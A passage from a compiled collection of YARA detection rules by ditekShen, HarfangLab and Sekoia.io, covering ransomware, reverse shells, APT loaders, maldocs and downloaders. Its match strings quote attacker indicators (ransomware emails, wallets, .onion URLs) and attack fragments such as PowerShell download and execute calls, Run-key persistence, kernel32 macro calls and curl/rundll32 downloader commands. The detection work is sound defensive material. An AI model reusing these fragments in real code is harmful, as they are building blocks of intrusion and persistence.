		$url13 = "://xqoykemmcivwtpxh3a6pu3w7sstr2y7hapxdiv4caaxidurmwwbjx2id.onion" ascii wide
		$url14 = "://y4722ss64vel5hmph75te7lx2x5xz463322ypjirm5ytxviijtdpybid.onion" ascii wide

	condition:
		(1 of ( $pk* ) and 1 of ( $url* ) )
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Koxic
{
	meta:
		description = "Detects files referencing identities associated with LokiLocker ransomware"
		author = "ditekShen"
		id = "4c4ff722-cac1-5967-9e79-681f47566e96"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L571-L580"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ca4d0e85cf4c7a134609262e21d5cef98100ba0a046d17ffe51bf3975dc7cae9"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "wilhelmkox@tutanota.com" ascii wide nocase
		$s2 = "F3C777D22A0686055A3558917315676D607026B680DA5C8D3D4D887017A2A844F546AE59F59F" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ryuk
{
	meta:
		description = "Detects files referencing identities associated with Ryuk ransomware"
		author = "ditekShen"
		id = "00cf99da-ff3c-5c91-8966-69a8afc8613a"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L582-L592"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a2b6106fc49dd254ca936e285fa0c2a3aee7110832686638d20d369d77f6c48f"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "WayneEvenson@protonmail.com" ascii wide nocase
		$s2 = "WayneEvenson@tutanota.com" ascii wide nocase
		$s3 = "14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Lockdown
{
	meta:
		description = "Detects files referencing identities associated with LockDown / cantopen ransomware"
		author = "ditekShen"
		id = "603f0113-d77b-590c-b2a0-804c6d1fbfbc"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L594-L603"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "cb17bb92d6e8189a08508481b75d301a1227906815c684753859914d77d7b3e7"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "CCWhite@onionmail.org" ascii wide nocase
		$s2 = "bc1q6ug0vrxz66d564qznclu9yyyvn6zurskezmt64" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Powershellcookiestealer
{
	meta:
		description = "Detects email accounts used for exfiltration observed in PowerShellCookieStealer"
		author = "ditekShen"
		id = "c2bbb9a8-3e4c-5676-9676-2708a196ef8d"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L706-L715"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bd404e94939acb92dd56a7d2a1f7536bcb3f520ca1e9dc614b53828afbc6dac8"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "senmn0w@gmail.com" ascii wide nocase
		$s2 = "mohamed.trabelsi.ena2@gmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Rhysida
{
	meta:
		description = "Detects files referencing identities associated with Rhysida ransomware"
		author = "ditekShen"
		id = "7ee0fb41-9267-5b65-ada3-229f2e390da6"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L1688-L1697"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "e3e07bab2982a30a5372e6708ede6707d132d410aa5b5b1a29bdb5d06910a88e"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "SethZemlak@onionmail.org" ascii wide nocase
		$s2 = "JacquieKunze@onionmail.org" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Payola
{
	meta:
		description = "Detects files referencing identities associated with Payola ransomware"
		author = "ditekShen"
		id = "7c1fc06b-fc71-5679-befd-686b2e05e3a4"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L1699-L1708"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "568141c03d14faef0cfc4f5fbdec45a5109a1ad5cbbe99e76a1db86e7ef4dc5d"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "pcsupport@skiff.com" ascii wide nocase
		$s2 = "pctalk01@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_OLE_Remotetemplate
{
	meta:
		description = "Detects XML relations where an OLE object is refrencing an external target in dropper OOXML documents"
		author = "ditekSHen"
		id = "fbf40436-fc0a-5e55-89ac-5e1dd93e1833"
		date = "2024-09-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L691-L702"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "80cc5b1a8a8899f632401956055374d265c734449e56ffeee5f0ba4911050f36"
		score = 75
		quality = 75
		tags = ""

	strings:
		$olerel = "relationships/oleObject" ascii
		$target1 = "Target=\"http" ascii
		$target2 = "Target=\"file" ascii
		$mode = "TargetMode=\"External" ascii

	condition:
		$olerel and $mode and 1 of ( $target* )
}

rule HARFANGLAB_Nhas_Reverse_Shell_Pe_Inmem_Large
{
	meta:
		description = "Matches packed NHAS reverse_ssh PE samples in-memory during execution"
		author = "HarfangLab"
		id = "f6b38e11-c405-5623-bea3-3a8d96b435af"
		date = "2024-09-24"
		modified = "2025-04-16"
		reference = "TRR250201"
		source_url = "https://github.com/HarfangLab/iocs/blob/1df815f4210f1d26151026cdd9658dbfc262b019/hl_public_reports_master.yar#L276-L294"
		license_url = "N/A"
		hash = "7798b45ffc488356f7253805dc9c8d2210552bee39db9082f772185430360574"
		logic_hash = "b9bbbbd93dc39f8c16c7f8275fa73f4c345c3ba8f21da76ae491e89d3a22c473"
		score = 75
		quality = 80
		tags = ""
		context = "memory"

	strings:
		$s1 = "\\rprichard\\proj\\winpty\\src\\agent\\" ascii
		$s2 = "\\Users\\mail\\source\\winpty\\src\\" ascii
		$s3 = "Successfully connnected" ascii
		$s4 = "*main.decFunc" ascii fullword
		$s6 = "keepalive-rssh@golang.org" ascii fullword
		$s7 = ".(*sshFxpSetstatPacket)." ascii

	condition:
		( all of them )
}

rule HARFANGLAB_Nhas_Reverse_Shell_Elf_Inmem_Large
{
	meta:
		description = "Matches packed NHAS reverse_ssh ELF samples in-memory during execution"
		author = "HarfangLab"
		id = "cd6f7b81-b8df-5e2b-9da6-981d1f62c131"
		date = "2024-09-24"
		modified = "2025-04-16"
		reference = "TRR250201"
		source_url = "https://github.com/HarfangLab/iocs/blob/1df815f4210f1d26151026cdd9658dbfc262b019/hl_public_reports_master.yar#L295-L312"
		license_url = "N/A"
		hash = "9f97997581f513166aae47b3664ca23c4f4ea90c24916874ff82891e2cd6e01e"
		logic_hash = "54ba4fc366fb6e4a252d51528ede3ec418b369881ad98e9119d1a9650b6a1bab"
		score = 75
		quality = 80
		tags = ""
		context = "memory"

	strings:
		$s1 = "/NHAS/reverse_ssh/cmd/client" ascii
		$s2 = "/handlers.runCommandWithPty" ascii
		$s3 = "/connection.RegisterChannelCallbacks" ascii
		$s4 = "/internal.RemoteForwardRequest" ascii
		$s7 = "main.Fork" ascii fullword

	condition:
		( all of them )
}

rule SEKOIA_Malware_Win_Lyceum_Maldoc_Macro_20220613
{
	meta:
		description = "Detect the macro contained in Lyceum maldoc to deploy its malware"
		author = "Sekoia.io"
		id = "3046bffd-261f-4d5b-9015-f2e5fc31c9c9"
		date = "2022-06-13"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/malware_win_lyceum_maldoc_macro_20220613.yar#L1-L15"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "a9f4957e8198b4cb2229913a405b3e0fc97cbd3598bb583dbfdaf56ca278d4cb"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "ActiveDocument.InlineShapes(i).PictureFormat.Brightness = 0.5" ascii

	condition:
		all of them
}

rule SEKOIA_Apt_Apt28_Htmlsmuggling
{
	meta:
		description = "Detects some kind of HTMLSmuggling used by APT28"
		author = "Sekoia.io"
		id = "2e20c992-d971-4c0f-99b3-a7d528c7055a"
		date = "2023-09-11"
		modified = "2024-12-19"
		reference = "https://www.zscaler.com/blogs/security-research/steal-it-campaign"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_apt28_htmlsmuggling.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "47cca1d0a0843c8df43661ee8188dae86cce06e1f3982973871863728d328e89"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "click();" ascii
		$s2 = "window.location.replace("

	condition:
		$s1 in ( @s2 .. @s2-100 )
}

rule SEKOIA_Apt_Kimsuky_Sharpext_Compromised_Securepreferences
{
	meta:
		description = "Detects compromised Chrome SecurePreferences file"
		author = "Sekoia.io"
		id = "aeda5d15-82e1-4ffc-8252-1eb4fc78d024"
		date = "2022-07-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_kimsuky_sharpext_compromised_securepreferences.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "662358fdb4c4cfa9984d06e391ade52e1c7a3d7b78724aea4fb0d6035fe2e7b2"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "\"devtools\", \"tabs\", \"webNavigation\", \"webRequest\", \"webRequestBlocking\""
		$ = "AppData\\\\Roaming"
		$ = "https://*/*"

	condition:
		all of them
}

rule SEKOIA_Gen_Empire_Onedrive_Stager
{
	meta:
		description = "Detects the Empire OneDrive stager"
		author = "Sekoia.io"
		id = "2053416f-1f53-491e-9c70-787a04362d16"
		date = "2022-01-26"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/gen_empire_onedrive_stager.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "90b3548cd3f4f7f936da70ec95dbe0ff3c1421d40a6e8557952d28d358b7c1f1"
		score = 75
		quality = 76
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$sleep = "Start-Sleep -Seconds $(($PI -as [Int])*2)" wide ascii nocase
		$down = "wc.DownloadData" wide ascii nocase

	condition:
		$down in ( @sleep .. @sleep + 1000 )
}

rule SEKOIA_Downloader_Mac_Rustbucket_Swiftloader
{
	meta:
		description = "Detect the file com.EdoneViewer in the new version of RustBucker 2023-10"
		author = "Sekoia.io"
		id = "bdbc95db-5d58-4c96-91f9-34b653e67f50"
		date = "2023-12-05"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/downloader_mac_rustbucket_swiftloader.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "acb5b88f8af53cd3d83de0fd6c3049ce017f038dc7c8b31f70e65e60bf713dfb"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "7c5bf60787bfd076c8806eaa4f1185f5b9fda69008376624ab3d17f207eb16a4"
		hash2 = "bc90adde92bd47b4de7d384e5b20c1a1791d603629bd0fcba4b550fb35e93216"
		hash3 = "c9a7b42c7b29ca948160f95f017e9e9ae781f3b981ecf6edbac943e52c63ffc8"

	strings:
		$ = "/Users/ghost/Desktop/EdoneViewer/EdoneViewer/"
		$ = "EdoneViewerApp.swift"

	condition:
		1 of them
}

rule SEKOIA_Tool_Enum4Linux_Strings
{
	meta:
		description = "Detects enum4linux based on strings"
		author = "Sekoia.io"
		id = "6b3094fe-1292-4da3-a1ed-9e255be531da"
		date = "2024-02-02"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/tool_enum4linux_strings.yar#L1-L22"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "d3f7ddbdfb679b34777298aec84464d55fac7600b855526a7f13d8c8f17ab888"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "my $os_info = `$command`;"
		$ = "($global_workgroup) = $os_info =~"
		$ = "sub enum_groups {"
		$ = "if ($shares =~ /NT_STATUS_ACCESS_DENIED/) {"
		$ = "Can't open share list file $shares_file"
		$ = "my $users = `$command`;"
		$ = "my @shares = <SHARES>;"
		$ = "foreach my $grouptype (\"builtin\", \"domain\") {"

	condition:
		6 of them
}

rule SEKOIA_Apt_Unk_Hrserv_Memory_Commands_Strings
{
	meta:
		description = "Detects HrServ web shell memory commands"
		author = "Sekoia.io"
		id = "1b5f442a-e758-4bd5-a612-8b504a542d29"
		date = "2023-11-23"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_unk_hrserv_memory_commands_strings.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "a87c35658ded301c098f9ee8ee5886a54e89537eabd145cf82b0286c703a77d2"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "list all the process" ascii wide
		$ = "equal with cmd /c tasklist" ascii wide
		$ = "start target service by name" ascii wide
		$ = "query local process information by wmi." ascii wide
		$ = "upload local shellcode to" ascii wide

	condition:
		all of them
}

rule SEKOIA_Water_Sigbin_Group
{
	meta:
		description = "Detects IOCs related to the 8220 Mining group."
		author = "Sekoia.io"
		id = "c49728e8-db7e-4d83-97d2-7d56b51f8a52"
		date = "2024-06-11"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/water_sigbin_group.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "dd51945bf79e37b50d377eda3641eb32438dcb5a1c55fb4a9b66a5b5a8b5ed0d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "Z12A3" ascii fullword
		$s2 = "FromBase64String" ascii fullword
		$s3 = "Start-Process" ascii fullword
		$s4 = "WriteAllBytes" ascii fullword

	condition:
		all of them
}

rule SEKOIA_Storm_1811_Files_Dat
{
	meta:
		description = "Detects files used in a campaign performed by the intrusion set Storm-1811"
		author = "Sekoia.io"
		id = "8b14f276-0c39-422b-9b19-d96b139a7ae8"
		date = "2024-06-10"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/storm_1811_files_dat.yar#L1-L24"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "d1d5b76671cefe8b876ca8df50205a04ebbcd973f115919b901f6a7946492904"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "RuntimeBroker" ascii fullword
		$s2 = "InstallSpamFilters" ascii fullword
		$s3 = "newfile333.txt" ascii fullword
		$s4 = "Installing spam filter kb_outlook" ascii fullword
		$s5 = "s.zip" ascii fullword
		$s6 = "Update completed" ascii fullword
		$s7 = "Updates installed" ascii fullword
		$s8 = "update_log.tgz uploaded ok" ascii fullword
		$s9 = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ascii fullword
		$s10 = "runtimebroker_connect" ascii fullword

	condition:
		5 of them
}

rule SEKOIA_Loader_Win_Operationmagalenha_Vbs
{
	meta:
		description = "Finds VBS file loading the PeepingTitle backdoor"
		author = "Sekoia.io"
		id = "b1f705d1-de3e-4ce6-9bb7-0e39b6e79add"
		date = "2023-05-31"
		modified = "2024-12-19"
		reference = "https://www.sentinelone.com/labs/operation-magalenha-long-running-campaign-pursues-portuguese-credentials-and-pii/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/loader_win_operationmagalenha_vbs.yar#L1-L39"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "bb1c48ea6a4d9f0bc04df558837f2d448b38eac920cb4030e01b915a4e442708"
		score = 75
		quality = 78
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$str01 = "'Skip to content" ascii
		$str02 = "'Search" ascii
		$str03 = "'Sign in" ascii
		$str04 = "'Sign up" ascii
		$str05 = "'Code" ascii
		$str06 = "'Terms" ascii
		$str07 = "'Privacy" ascii
		$str08 = "'Security" ascii
		$str09 = "'Status" ascii
		$str10 = "'Docs" ascii
		$str11 = "'Contact GitHub" ascii
		$str12 = "'Pricing" ascii
		$str13 = "'API" ascii
		$str14 = "'Training" ascii
		$str15 = "'Blog" ascii
		$str16 = "'About" ascii
		$vbs01 = "WScript.Sleep" ascii nocase
		$vbs02 = "Set obj" ascii nocase
		$vbs03 = "Dim obj" ascii nocase
		$vbs04 = "https://tinyurl.com" ascii nocase
		$vbs05 = "C:\\Users\\Public" ascii nocase
		$vbs06 = "CreateObject(\"WScript.Shell\")" ascii nocase
		$vbs07 = ".SaveToFile" ascii nocase

	condition:
		10 of ( $str* ) and 5 of ( $vbs* )
}

rule SEKOIA_Apt_Apt29_Wineloader_Malicious_Hta
{
	meta:
		description = "Detects malicious HTA used by APT29 to drop Wineloader"
		author = "Sekoia.io"
		id = "5a17d854-0564-4830-a0e5-7867b99716c2"
		date = "2024-03-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_apt29_wineloader_malicious_hta.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		hash = "efafcd00b9157b4146506bd381326f39"
		logic_hash = "0cc4692e5ff3f258c287f28030147f725d6a534c4f2f7a2a4ff49a305b7fd13d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<HTA:APPLICATION ID="
		$ = "var _0x"
		$ = "Date['\\x6e\\x6f\\x77']"

	condition:
		all of them
}

rule SEKOIA_Apt_Buhtrap_Maldocx
{
	meta:
		description = "Detect the malicious DOCX used by Buhtrap"
		author = "Sekoia.io"
		id = "4aaba2f1-fafd-4e3f-8b18-7beda11464d1"
		date = "2022-02-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_buhtrap_maldocx.yar#L1-L25"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "69968fa6836a71cd835f40c5168d197d3b5fc13b62791279f48a6bdeb4709bd5"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<xm:macrosheet xmlns=" ascii fullword
		$ = "CALL(\"kernel32\",\"VirtualFree"
		$ = "CALL(\"kernel32\",\"CreateFileA"
		$ = "CALL(\"kernel32\",\"WriteFile"
		$ = "CALL(\"kernel32\",\"VirtualAlloc"
		$ = "CALL(\"kernel32\",\"WinExec"
		$ = "CALL(\"kernel32\",\"lstrcatA"
		$ = "CALL(\"kernel32\",\"CreateFileA"
		$ = "CALL(\"kernel32\",\"VirtualFree"
		$ = "CALL(\"kernel32\",\"ExpandEnvironmentStringsA"
		$ = "CALL(\"kernel32\",\"CloseHandle"

	condition:
		all of them
}

rule SEKOIA_Vpn_Mul_Softether
{
	meta:
		description = "Detect the open-source SoftEther VPN"
		author = "Sekoia.io"
		id = "a1fbf4fe-b934-4a66-b6b1-ebe2f83505cd"
		date = "2024-04-15"
		modified = "2024-12-19"
		reference = "https://www.softether.org/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/vpn_mul_softether.yar#L1-L29"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "f93e838631518590e518f29557c60a40734da30b62c056f8ebb8febed389551b"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\softether_se%s"
		$ = "GET /vgc_download_dat/ HTTP/1.1"
		$ = "http://x%c.x%c.client.api.vpngate2.jp/api/"
		$ = "http://x0.x0.client.api.vpngate2.jp/check/check.txt"
		$ = "https://x%c.x%c.statistics.api.vpngate2.jp/api/statistics/"
		$ = "Software\\SoftEther Project\\SoftEther VPN\\"
		$ = "|vpnsetup_nosign.exe" wide
		$ = "/ISEASYINSTALLER:%u" wide
		$ = "/CALLERSFXPATH:\"%s\"" wide
		$ = "vpn_client.config" wide
		$ = "vpn_bridge.config" wide
		$ = "|backup_dir_readme.txt" wide
		$ = "vpn_debuginfo_%04u%02u%02u_%02u%02u%02u.zip" wide

	condition:
		8 of them
}

rule SEKOIA_Rat_Win_Reverserat
{
	meta:
		description = "Detect SideCopy's ReverseRAT v3 observed in January 2023"
		author = "Sekoia.io"
		id = "8fbd395f-f44e-46d5-a942-7c7e88f37127"
		date = "2023-02-22"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/rat_win_reverserat.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		hash = "b277a824b2671f40298ce03586a2ccc0fca2a081a66230c57a3060c2028f13ee"
		hash = "8b87459483248d7b95424cd52b7d4f3031e89c6644adc2e167556e071d9ec3aa"
		logic_hash = "13a5a916e084996ce4d7840581250f7630652acdcad0f66e21763cb3a9cbccc3"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "SELECT maxclockspeed,  datawidth, name, manufacturer FROM Win32_Processor" wide
		$ = "select * from Win32_PhysicalMemory" wide
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" wide

	condition:
		all of them
}

rule SEKOIA_Apt_Lazarus_Blindingcan_Rtti
{
	meta:
		description = "Detects BLINDINGCAN with RTTI"
		author = "Sekoia.io"
		id = "9a16c189-ffc1-4aa6-8582-298abaecd0ef"
		date = "2022-10-04"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_lazarus_blindingcan_rtti.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "fbec1f9a180782bf330d86facbada9af018741897c58f4ab6e0b52a1b38ae966"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = ".?AVCHTTP_Protocol@@" ascii wide fullword
		$s2 = ".?AVCFileRW@@" ascii wide fullword

	condition:
		all of them
}

rule SEKOIA_Apt_Muddywater_Powershell_Reverse_Secure_Proxy
{
	meta:
		description = "Detects PowerShell Reverse Secure Proxy"
		author = "Sekoia.io"
		id = "b255f327-cb56-41b7-82f7-83ee23f791a5"
		date = "2023-11-14"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_muddywater_powershell_reverse_secure_proxy.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "6507bc030d60af5559492bbb02bc619646306ab06c9bd9d3f78ae6ce55307bda"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "$CS.Read($buff,4,2) | Out-Null" ascii wide
		$ = "$DP = $buff[2]*256 + $buff[3]" ascii wide
		$ = "$PS3.BeginInvoke() | Out-Null" ascii wide

	condition:
		all of them
}

rule SEKOIA_Apt_Susp_Apt28_Uac0063_Hta_Loader
{
	meta:
		description = "Detects some suspected APT28 HTA loader"
		author = "Sekoia.io"
		id = "8e1889c1-c6ac-4048-9d3a-99ccbbd5435f"
		date = "2024-07-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_susp_apt28_uac0063_hta_loader.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		hash = "332d9db35daa83c5ad226b9bf50e992713bc6a69c9ecd52a1223b81e992bc725"
		logic_hash = "494331a8088d350e4e49e67fe64041d451886e501775413f908bd9b3faa98aeb"
		score = 65
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<HEAD><HTA:APPLICATION ID" ascii fullword
		$ = "id=service>null</span" ascii fullword
		$ = "script Language=\"VBScript.Encode" ascii fullword

	condition:
		2 of them
}

rule SEKOIA_Downloader_Win_Curl_Agent
{
	meta:
		description = "Detect the downloader used by Bluenoroff to install it CurlAgent"
		author = "Sekoia.io"
		id = "ddeb2d8f-1b10-4a33-b768-d19412e8551a"
		date = "2023-05-02"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/downloader_win_curl_agent.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "b34375ec051c969adec82901c1130b0a389261912559d70c652ee826cb2d4107"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "%s\\marcoor.dll" wide
		$ = "curl -A cur1-agent -L %s -s -d dl"
		$ = "curl -A cur1-agent -L %s -s -d da"
		$ = "cmd /c timeout /t 10 & rundll32 \"%s\" #1" wide
